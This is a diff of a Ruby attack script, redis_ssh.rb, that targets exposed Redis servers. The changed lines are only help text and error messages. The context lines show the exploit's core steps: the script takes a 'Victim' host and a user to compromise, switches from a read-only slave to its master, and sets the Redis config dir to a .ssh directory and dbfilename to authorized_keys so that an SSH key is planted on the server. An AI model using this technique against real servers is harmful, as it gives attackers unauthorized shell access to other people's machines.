@@ -24,7 +24,7 @@ EOF
 OptionParser.new do |parser|
 	parser.banner = "Usage: ./redis_ssh.rb [options]"
 
-	parser.on("-h", "--host HOST", "Victim") do |h|
+	parser.on("-h", "--host HOST", "Victim (required)") do |h|
 		@opts[:host] = h
 	end
 	parser.on("-p", "--port PORT", /\d*/, "Port (default: 6379)") do |p|
@@ -36,10 +36,10 @@ OptionParser.new do |parser|
 	parser.on("-t", "--timeout TIME", "Time to wait for packets (default: 1)") do |t|
 		@opts[:timeout] = t
 	end
-	parser.on("-u", "--user USER", "User to try and compromise") do |u|
+	parser.on("-u", "--user USER", "Force specific user") do |u|
 		@opts[:user] = u
 	end
-	parser.on("-d", "--dir DIR", ".ssh directory to use") do |d|
+	parser.on("-d", "--dir DIR", "Force specific directory") do |d|
 		@opts[:dir] = d
 	end
 	parser.on("-s", "--sshport PORT", "Port to ssh to (default: 22)") do |s|
@@ -58,7 +58,7 @@ OptionParser.new do |parser|
 end.parse!
 
 if !@opts[:host]
-	puts "Invalid arguments!"
+	puts "Missing host!"
 	return
 end
 
@@ -134,7 +134,7 @@ end
 infogather
 
 if @info["slave_read_only"] == "1"
-	return Log.err "This is a readonly slave! But master server is down!" if @info["master_link_status"] == "down"
+	return Log.err "This is a readonly slave and master server is down!" if @info["master_link_status"] == "down"
 	Log.warn "This is a readonly slave! Attempting to switch to master instead!"
 	@opts[:host] = @info["master_host"]
 	@opts[:port] = @info["master_port"]
@@ -214,7 +214,7 @@ end
 Log.info "Setting configuration directory"
 out = send "config set dir #{@opts[:dir]}"
 Log.res out if @opts[:verbose]
-return Log.err "Failed to change config directory to .ssh" if out != "+OK\r\n"
+return Log.err "Failed to change config directory to .ssh (might not exist)" if out != "+OK\r\n"
 
 Log.info "Change database file to authorized_keys"
 out = send "config set dbfilename authorized_keys"
